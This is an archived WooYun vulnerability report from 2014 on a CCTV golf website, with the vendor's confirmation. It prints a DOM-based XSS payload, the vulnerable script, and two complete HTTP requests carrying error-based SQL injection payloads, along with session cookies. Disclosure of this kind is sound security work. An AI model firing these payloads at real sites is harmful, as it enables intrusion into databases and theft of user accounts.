{"id": 43254, "wybug_id": "wooyun-2014-083301", "wybug_title": "CCTV某站DOM-BasedXSS+多个SQL注入小礼包", "wybug_corp": "中国网络电视台", "wybug_author": "BMa", "wybug_date": "2014-11-17 10:17", "wybug_open_date": "2015-01-01 10:18", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "16", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-11-17：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-11-17：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-11-27：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-12-07：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-12-17：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-01-01：\t细节向公众公开  简要描述： CCTV某站DOM-Based XSS+多个SQL影响大概有300+表，账号可能影响央视所有网站用户，例如央视微博：http://t.cntv.cn/login，使用的相同的登录入口不想深入 详细说明：  DOM-based XSS页面：http://golf.cctv.com/e/ViewImg/index.htmlPAYLOAD:http://golf.cctv.com/e/ViewImg/index.html?url=javascript:alert%28/BMa/%29看看index.html的源码：关键代码：\n<script>\tif(Request(\"url\")!=0){\tdocument.write(\"<a title=\\\"点击观看完整的图片...\\\" href=\\\"\"+Request(\"url\")+\"\\\" target=\\\"_blank\\\"><img src=\\\"\"+Request(\"url\")+\"\\\" border=0 class=\\\"picborder\\\" onmousewheel=\\\"return bbimg(this)\\\" onload=\\\"if(this.width>screen.width-500)this.style.width=screen.width-500;\\\">\");    }\t</script>\n取request的URL，并且写入到<a>和<img>中，没有任何过滤，构造payload：http://golf.cctv.com/e/ViewImg/index.html?url=javascript:alert%28/BMa/%29看看效果：\n\n\n\nSQL1:\nPOST /e/extend/court/court_detail.php?courtid=166 HTTP/1.1Content-Length: 406Content-Type: application/x-www-form-urlencodedCookie: uystmcheckplkey=1415935444%2C4005959c49da7ddf2601a4b1543e3e29%2C2454; PHPSESSID=07arnuunqn4t1u9abmsiov4ag3; uystmreturnurl=http%3A%2F%2Fgolf.cctv.com%2Fe%2FDoInfo%2F; uystmlastforfenid=146n58149Host: golf.cctv.comConnection: Keep-aliveAccept-Encoding: gzip,deflateUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) Gecko/20100101 Firefox/31.0Accept: */*courtid=166&plscore%5b%5d=&pltext='and(select%201%20from(select%20count(*)%2cconcat((select%20concat(CHAR(52)%2cCHAR(67)%2cCHAR(117)%2cCHAR(74)%2cCHAR(115)%2cCHAR(77)%2cCHAR(106)%2cCHAR(87)%2cCHAR(81)%2cCHAR(115)%2cCHAR(119))%20from%20information_schema.tables%20limit%200%2c1)%2cfloor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)and'&submit=%e5%8f%91%e8%a1%a8%e8%af%84%e8%ae%ba&uid=\nSQL2:\nGET /e/extend/court/court_search.php?pt='and(select%201%20from(select%20count(*)%2cconcat((select%20concat(CHAR(52)%2cCHAR(67)%2cCHAR(117)%2cCHAR(98)%2cCHAR(116)%2cCHAR(52)%2cCHAR(80)%2cCHAR(53)%2cCHAR(99)%2cCHAR(114)%2cCHAR(56))%20from%20information_schema.tables%20limit%200%2c1)%2cfloor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)and' HTTP/1.1Cookie: uystmcheckplkey=1415935444%2C4005959c49da7ddf2601a4b1543e3e29%2C2454; PHPSESSID=07arnuunqn4t1u9abmsiov4ag3; uystmreturnurl=http%3A%2F%2Fgolf.cctv.com%2Fe%2FDoInfo%2F; uystmlastforfenid=146n58149Host: golf.cctv.comConnection: Keep-aliveAccept-Encoding: gzip,deflateUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) Gecko/20100101 Firefox/31.0Accept: */*\n\n\n\n\n   漏洞证明：     修复方案：     版权声明：转载请注明来源 BMa@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2014-11-17 11:36 厂商回复： 非常感谢，我们将尽快进行该业务的整改！～～感谢您对我们的支持和帮助！～～～ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}